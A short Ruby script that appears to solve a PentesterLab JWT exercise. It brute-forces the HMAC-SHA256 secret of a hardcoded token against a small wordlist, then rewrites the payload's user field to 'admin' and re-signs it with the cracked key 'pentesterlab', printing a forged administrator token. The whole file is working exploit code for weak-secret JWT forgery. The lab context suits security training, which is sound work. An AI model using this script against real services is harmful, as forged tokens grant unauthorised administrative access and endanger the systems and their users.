#!/usr/bin/env ruby

require "base64"
require "json"
require "openssl"



jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"

if jwt.count(".") != 2
  abort "Error: JWT must have exactly 2 dots"
end

header_encoded, payload_encoded, signature_encoded = jwt.split(".")

header = Base64.urlsafe_decode64(header_encoded)
payload = Base64.urlsafe_decode64(payload_encoded)
signature = Base64.urlsafe_decode64(signature_encoded)

header_hash = JSON.parse(header)

if !header_hash.has_key?("alg")
  abort "Error: Header is missing an alg value"
end

if header_hash["alg"] != "HS256"
  abort "Error: Header has an alg value other than HS256"
end

keys = ["hacker", "jwt", "insecurity", "pentesterlab", "hacking"]

keys.each do |key|
  puts "Trying #{key}"
  guess_signature = OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), key, "#{header_encoded}.#{payload_encoded}")
  guess_signature_encoded = Base64.urlsafe_encode64(guess_signature).split("=")[0]

  if guess_signature == signature
    puts "  Signature matches!"
  end
  if guess_signature_encoded == signature_encoded
    puts "  Encoded signature matches!"
  end
end

puts "-- Finished bruteforce --"


payload_hash = JSON.parse(payload)

if !payload_hash.has_key?("user")
  abort "Error: Payload is missing a user value"
end

payload_hash["user"] = "admin"
payload_modified = payload_hash.to_json
payload_modified_encoded = Base64.urlsafe_encode64(payload_modified).split("=")[0]


signature_modified = OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), "pentesterlab", "#{header_encoded}.#{payload_modified_encoded}")
signature_modified_encoded = Base64.urlsafe_encode64(signature_modified).split("=")[0]

puts "#{header_encoded}.#{payload_modified_encoded}.#{signature_modified_encoded}"
